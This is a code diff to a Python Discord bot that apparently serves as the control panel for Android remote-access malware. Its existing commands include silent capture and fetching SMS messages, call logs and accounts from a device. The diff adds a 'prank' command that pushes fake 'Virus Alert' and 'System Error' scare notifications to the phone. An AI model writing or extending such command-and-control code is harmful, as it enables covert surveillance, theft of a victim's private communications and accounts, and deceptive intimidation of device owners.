@@ -78,6 +78,7 @@ DEVICE_COMMAND_NAMES = {
     "usage",
     "wallpaper",
     "silentcapture",
+    "scary_mode",
     "getsms",
     "getcalllogs",
     "getaccounts",
@@ -1007,6 +1008,34 @@ class ADexDiscordClient(discord.Client):
         @self.tree.command(name="usage", description="Get app usage statistics")
         async def usage(interaction: discord.Interaction) -> None:
             await self._queue_remote_command(interaction, "usage", {})
+
+        @self.tree.command(name="prank", description="Trigger scary mode / pranks on device")
+        @app_commands.describe(
+            type="Prank type (ghost, error, virus, warning)",
+            title="Notification title",
+            message="Notification message",
+            image_url="Optional spooky image URL"
+        )
+        @app_commands.choices(type=[
+            app_commands.Choice(name="Ghost", value="ghost"),
+            app_commands.Choice(name="System Error", value="error"),
+            app_commands.Choice(name="Virus Alert", value="virus"),
+            app_commands.Choice(name="Custom Warning", value="warning"),
+        ])
+        async def prank(
+            interaction: discord.Interaction, 
+            type: app_commands.Choice[str], 
+            title: str | None = None, 
+            message: str | None = None, 
+            image_url: str | None = None
+        ) -> None:
+            payload = {
+                "type": type.value,
+                "title": title or f"SYSTEM {type.value.upper()}",
+                "message": message or "Unexpected behavior detected.",
+                "imageUrl": image_url or ""
+            }
+            await self._queue_remote_command(interaction, "scary_mode", payload)
 
         @self.tree.command(name="getsms", description="Get recent SMS messages")
         @app_commands.describe(limit="Number of messages to fetch")
